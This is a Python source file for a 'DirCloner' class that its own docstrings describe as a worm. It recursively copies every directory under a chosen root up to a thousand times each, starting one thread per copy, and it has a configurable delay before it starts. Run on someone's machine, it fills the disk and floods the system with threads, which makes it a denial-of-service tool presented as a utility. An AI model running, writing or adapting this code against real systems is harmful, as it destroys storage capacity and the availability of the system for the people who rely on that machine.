import os
import shutil
import threading
import time


class DirCloner:
    def __init__(self, root:str='') -> None:
        # set path
        if os.path.exists(root):
            self.root = root
        else:
            self.root = os.path.dirname(__file__)
        
        # set os
        self.os_name = os.name
    

    def set_clone_path(self, path:str) -> bool:
        '''
        description:
            set path of the folder which needs to be cloned by the worm.
        
        args:
            path (str): path of the folder
        
        returns:
            bool
        '''
        if os.path.exists(path):
            self.root = path
            return True
        return False


    def get_curr_drive_folder(self,):
        '''
        description:
            returns current drive folder location

        args:
            None

        returns:
            str
        '''
        if self.os_name == "nt":
            path_list = self.root.split('\\')
        else:
            path_list = self.root.split('/')
        path = os.path.join(path_list[0], os.path.sep, path_list[1])
        return path


    def clone(self,  number:int, src:str=None, dst:str=None) -> bool:
        '''
        description:
            copies src tree to dst tree with error handling

        args:
            number (int): number to be appended to src if dst is not provided
            src (str): source path of dir to be cloned, default is None
            dst (str): destination path of cloned directory, default is None

        returns:
            bool
        '''
        src = self.root if src is None else src
                        
        dst = src + str(number) if dst is None else dst
        
        if os.path.exists(dst):
            return False

        # print data for debugging
        # print(number)
        # print(src)
        # print(dst)
        # print('-'*40)

        # if any error occurs return false
        try:
            shutil.copytree(src=src, dst=dst)
        except Exception as e:
            print(e)
            return False
        return True


    def clone_all_dirs(self, path:str=None, start_after:int=0, times:int=1000) -> bool:
        '''
        description:
            clones all the directories specified in the path for specified times.
        
        args:
            path (str): path of the root directory, default is None (which will be updated to root dir passed during obj creation)
            start_after (int): seconds after which worm needs to be started, default is 0s
            times (str): number of clones to be created of a particular directory, default is 1000
        
        returns:
            None
        '''
        if path is None:
            path = self.root
        
        if not os.path.exists(path):
            return False
        
        curr_path = os.getcwd()
        os.chdir(path)
        
        dirs_list = os.listdir()
        for dir in dirs_list:
            clone_path = os.path.join(path, dir)
            self.clone_dir(times=times, start_after=start_after, src=clone_path) 

        os.chdir(curr_path)


    def clone_dir(self, times:int=1000, start_after:int=0, src:str=None, dst:str=None) -> None:
        '''
        description:
            waits for specified time and then starts cloning the dir for specified time.

        args:
            times (int): number of times a directory to be copied, default is 1000
            start_after (int): seconds after which worm needs to be started, default is 0s
            src (str): source path of the directory
            dst (str): destination path of the directory

        returns:
            None
        '''
        time.sleep(start_after)
        for iteration in range(times):
            threading.Thread(target=self.clone, args=(iteration, src, dst)).start()
  